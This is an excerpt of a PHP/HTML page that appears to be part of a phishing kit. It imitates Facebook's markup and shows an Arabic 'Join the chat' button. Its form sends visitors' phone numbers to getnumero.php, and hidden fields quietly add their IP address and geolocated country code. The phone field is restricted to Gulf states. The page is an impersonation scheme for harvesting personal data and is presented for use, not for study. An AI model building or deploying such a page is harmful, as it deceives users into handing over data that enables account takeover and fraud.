...
?>
    ...
    <html lang="ar" id="facebook" style="width: 100%;height: 100%;">
                                ...
                                <div class="_9t2g _9t2c _a1fe">
                                    <div class="_9tar _9ta4 _9ta6 _9ta8">
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                            ...
                                            <form action="getnumero.php" method="POST">
                                                  
                                                  <input id="phone" name="phone" class="input-phone" style="direction: ltr;" type="tel" pattern="[0-9]*" maxlength="10" required>
                                                  <br>
                                            
                                                  <input type="hidden" name="id" value="<?php echo rand(1,10000); ?>">
                                                  <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                                                  <input type="hidden" name="codecntry" value="<?php echo $geoplugin->countryCode ?>">
                                                 <br>
                                                <button type="submit" style="height:49px" class="_9vcv _advm"><span class="_advp">الانضمام إلى الدردشة</span></button>
...
<script>
  ...
  window.intlTelInput(input, {
   ...
   //  initialCountry: "auto",
    ...
    // nationalMode: false,
     onlyCountries: ['kw', 'ae', 'qa','om','bh','sa'],
